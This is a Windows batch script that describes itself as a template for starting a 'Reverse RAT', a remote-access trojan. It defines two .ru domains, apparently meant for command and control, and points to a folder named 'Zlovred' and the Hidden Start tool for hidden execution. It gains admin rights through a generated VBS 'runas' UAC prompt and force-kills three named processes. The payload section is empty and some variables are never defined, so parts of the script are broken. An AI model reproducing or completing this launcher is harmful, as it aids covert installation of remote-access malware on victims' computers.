@echo off
rem *******************************************************
rem templ_start.bat
rem Template to Start Reverse RAT
rem
rem RETURNS:    0 if Success Run
rem             1 if Check Integrity Error
rem             2 if No Internet Connection
rem             3 if Service already run
rem             17 if run without elevated privileges
rem
rem *******************************************************
@echo off

rem Set variablees

rem Set Folders
set ZLOVRED=c:\pub1\Distrib\Zlovred
set pathCMD=%SystemRoot%\system32
set UTIL=C:\Util

rem Set System Files...
set HSTARTEXE="C:\Program Files\Hidden Start\hstart.exe"
set PINGEXE=%pathCMD%\PING.EXE
set TASKLISTEXE=%pathCMD%\tasklist.exe
set TASKKILLEXE=%pathCMD%\taskkill.exe
set FINDEXE=%pathCMD%\find.exe

rem Set Other Variables
set domain01=win.netip4.ru
set domain02=lin.netip4.ru

set CLOSEDPROC01=defrevr1234.exe
set CLOSEDPROC02=defrevl1234.exe
set CLOSEDPROC03=stalin1234_x64.exe

rem Check Integrity
rem
if not exist %HSTARTEXE% echo File %HSTARTEXE% is not Found && exit /b 1
if not exist %PINGEXE% echo File %PINGEXE% is not Found && exit /b 1
if not exist %ZLOVRED% echo File %ZLOVRED% is not Found && exit /b 1
if not exist %FINDEXE% echo File %FINDEXE% is not Found && exit /b 1
if not exist %TASKKILLEXE% echo File %TASKKILLEXE% is not Found && exit /b 1
if not exist %TASKLISTEXE% echo File %TASKLISTEXE% is not Found && exit /b 1

rem Run Payloads
rem

rem
title Installing Packages
::-------------------------------------
REM  --> CheckING for permissions
net session >nul 2>&1

REM --> If error flag set, we do not have admin.
if '%errorlevel%' NEQ '0' (
    echo Requesting administrative privileges...
    goto UACPrompt
) else ( goto gotAdmin )

:UACPrompt
rem Lock Data
rem exit /b 17
rem
set getadminvbs=nit-%~n0.vbs
    echo Set UAC = CreateObject^("Shell.Application"^) > "%TPDL%\%getadminvbs%"
    set params = %*:"="
    echo UAC.ShellExecute "cmd.exe", "/c %~s0 %params%", "", "runas", 1 >> "%TPDL%\%getadminvbs%"

    %wscriptexe% "%TPDL%\%getadminvbs%"
    del "%TPDL%\%getadminvbs%"
    exit /B 0

:gotAdmin
echo Run as Admin...

rem Kill closed process
rem
%TASKLISTEXE% | %FINDEXE% /I "%CLOSEDPROC01%"  > nul 2> nul
if %errorlevel% EQU 0 %TASKKILLEXE% /IM %CLOSEDPROC01% /F  > nul 2> nul

%TASKLISTEXE% | %FINDEXE% /I "%CLOSEDPROC02%"  > nul 2> nul
if %errorlevel% EQU 0 %TASKKILLEXE% /IM %CLOSEDPROC02% /F  > nul 2> nul

%TASKLISTEXE% | %FINDEXE% /I "%CLOSEDPROC03%"  > nul 2> nul
if %errorlevel% EQU 0 %TASKKILLEXE% /IM %CLOSEDPROC03% /F  > nul 2> nul

:End
@echo The End of the Script %0
exit /b 0
